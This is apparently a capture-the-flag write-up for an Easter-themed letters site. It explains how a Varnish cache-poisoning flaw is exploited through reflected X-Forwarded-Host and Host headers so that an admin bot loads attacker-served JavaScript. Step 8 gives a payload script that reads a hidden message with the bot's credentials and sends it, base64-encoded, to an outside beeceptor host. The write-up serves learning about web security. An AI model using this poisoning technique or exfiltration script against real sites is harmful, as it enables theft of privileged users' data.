
## I have added an automation GO script


## wrietup

we have a site that you leave letters , and our flag is in on of this letters (letter 3 specfic) but it need an admin auth to see it
![Screenshot_84](https://github.com/kiro6/writeups/assets/57776872/372cfff9-ba16-4a15-9777-20847650d793)

project structre 
```
.
├── build-docker.sh
├── challenge
│   ├── index.js
│   ├── package.json
│   ├── routes
│   │   └── routes.js
│   ├── static
│   │   ├── background.png
│   │   ├── favicon.ico
│   │   ├── main.css
│   │   ├── main.js
│   │   ├── queen.svg
│   │   ├── sign-post.png
│   │   └── viewletter.js
│   ├── utils
│   │   ├── authorisation.js
│   │   ├── bot.js
│   │   └── database.js
│   └── views
│       ├── base.html
│       ├── index.html
│       ├── letter.html
│       └── viewletters.html
├── config
│   ├── cache.vcl
│   └── supervisord.conf
└── Dockerfile
```

i will mention the most important parts to solve the challenge 

## cache.vcl
in Varnish Configuration , the cache based on url and host header
```vcl
sub vcl_hash {
    hash_data(req.url);

    if (req.http.host) {
        hash_data(req.http.host);
    } else {
        hash_data(server.ip);
    }

    return (lookup);
}
```

## routs.js
in `/` and `/letters` cdn can be controlled by the user  
```js
router.get("/", (req, res) => {
    return res.render("index.html", {
        cdn: `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/`,
    });
});

router.get("/letters", (req, res) => {
    return res.render("viewletters.html", {
        cdn: `${req.protocol}://${req.hostname}:${req.headers["x-forwarded-port"] ?? 80}/static/`,
    });
});
```

- when the submit func `visit` is called from `bot.js`
- `/submit` endpoint take json object contain message attribute
```js
router.post("/submit", async (req, res) => {
    const { message } = req.body;

    if (message) {
        return db.insertMessage(message)
            .then(async inserted => {
                try {
                    botVisiting = true;
                    await visit(`http://127.0.0.1/letters?id=${inserted.lastID}`, authSecret);
                    botVisiting = false;
                }
                catch (e) {
                    console.log(e);
                    botVisiting = false;
                }
                res.status(201).send(response(inserted.lastID));
            })
            .catch(() => {
                res.status(500).send(response('Something went wrong!'));
            });
    }
    return res.status(401).send(response('Missing required parameters!'));
});
```



message endpint used to get other letters
```js
router.get("/message/:id", async (req, res) => {
    try {
        const { id } = req.params;
        const { count } = await db.getMessageCount();
        const message = await db.getMessage(id);

        if (!message) return res.status(404).send({
            error: "Can't find this note!",
            count: count
        });

        if (message.hidden && !isAdmin(req))
            return res.status(401).send({
                error: "Sorry, this letter has been hidden by the easter bunny's helpers!",
                count: count
            });

        if (message.hidden) res.set("Cache-Control", "private, max-age=0, s-maxage=0 ,no-cache, no-store");

        return res.status(200).send({
            message: message.message,
            count: count,
        });
    } catch (error) {
        console.error(error);
        res.status(500).send({
            error: "Something went wrong!",
        });
    }
});
```
## bot.js

on every submit to a letter a bot is visiting the last submttied letter
```js
const puppeteer = require('puppeteer');

const browser_options = {
    headless: true,
    args: [
        '--no-sandbox',
        '--disable-background-networking',
        '--disable-default-apps',
        '--disable-extensions',
        '--disable-gpu',
        '--disable-sync',
        '--disable-translate',
        '--hide-scrollbars',
        '--metrics-recording-only',
        '--mute-audio',
        '--no-first-run',
        '--safebrowsing-disable-auto-update',
        '--js-flags=--noexpose_wasm,--jitless'
    ],
};

const visit = async(url, authSecret) => {
    try {
        const browser = await puppeteer.launch(browser_options);
        let context = await browser.createIncognitoBrowserContext();
        let page = await context.newPage();

        await page.setCookie({
            name: 'auth',
            value: authSecret,
            domain: '127.0.0.1',
        });

        await page.goto(url, {
            waitUntil: 'networkidle2',
            timeout: 5000,
        });
        await page.waitForTimeout(3000);
        await browser.close();
    } catch (e) {
        console.log(e);
    }
};

module.exports = visit;
```

# Steps 
1) i found out that `X-Forwarded-Host` i accepted and reflected on `/` and `/letters`
2) we can cache posion the server , send him `X-Forwarded-Host: My_Server` 
3) set `Host: 127.0.0.1` to make the cache server map it to the server ip , so when the bot in `bot.js` visit it it will be served the poioned cache
4) use the url with id paramter potiong to the next letter will be added while poioning the cache , here used `/letters?id=15` because i will add it later
![Screenshot_80](https://github.com/kiro6/writeups/assets/57776872/eb5e22d1-5b40-407a-8649-78bfe904a7e7)

5) now every request for a url in the frontend use absloute path like `/viewletter.js` and `main.js` will be requsted as `http://My_Server/viewletter.js`

6) submit a new letter
 ![Screenshot_81](https://github.com/kiro6/writeups/assets/57776872/d39b231e-641d-491e-a1f9-2be6467135db)

7) now the bot visted `/letters?id=15` which we posioned later
8) the bot will request `/viewletter.js` which we serve in our server as
```js
fetch("http://127.0.0.1:80/message/3").then((r) => {
    return r.text();
}).then((data)=>{
fetch("https://htbsolver.free.beeceptor.com/"+btoa(data) )
})
```
9) the script executed in the bot and send use the result
![Screenshot_85](https://github.com/kiro6/writeups/assets/57776872/1554bc0c-30a0-461e-bd36-922a4bacfc60)
10) decode the base64 to get the flag
```
{"message":"Dear Easter Bunny, Santa's better than you! HTB{7h3_3as7er_bunny_h45_b33n_p0150n3d!}","count":15}
```
